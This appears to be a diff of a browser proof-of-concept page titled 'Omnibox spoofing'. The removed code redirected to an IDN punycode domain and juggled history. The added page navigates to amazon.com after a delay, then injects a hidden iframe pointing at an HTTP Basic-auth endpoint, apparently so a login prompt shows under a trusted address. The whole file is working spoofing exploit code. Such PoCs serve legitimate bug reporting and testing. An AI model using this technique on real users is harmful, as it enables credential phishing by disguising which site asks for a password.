@@ -1,7 +1,56 @@
-<script>
-function aa(){
-location.replace('http://xn--lwcc.com/test/spoof/chrome/e.html');
-  window.history.go(1);alert();  window.history.go(-1);
+
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<title>Omnibox spoofing</title>
+	<style>
+		body{
+		    margin-top: 0px; 
+		    margin-bottom: 0px; 
+		    margin-left: 0px; 
+		    margin-right: 0px;
+		    padding: 0;
+		}
+      .input1 {
+  background-color: red;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 36px;
+  margin: 4px 2px;
+  cursor: pointer;
 }
-</script>
-<button onclick="aa()">Click me</button>
+.input2 {
+  background-color: green;
+  border: none;
+  color: white;
+  padding: 125px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 36px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+	</style>
+
+	<script>
+		function exec() {
+				document.getElementById("content").innerHTML+= '<iframe src="https://jigsaw.w3.org/HTTP/Basic/" style="visibility:hidden;display:none"></iframe>';
+		}
+	</script>
+</head>
+
+<body>
+	<div id="content">
+        <input class="input1" onclick="setTimeout(function(){document.location='https://www.amazon.com'}, 559)" type="button" style="size:32" value="click here first"></center>
+		<input class="input2" onclick="exec();" type="button" value="then click here ">
+	</div>
+
+</body>
+
+</html>
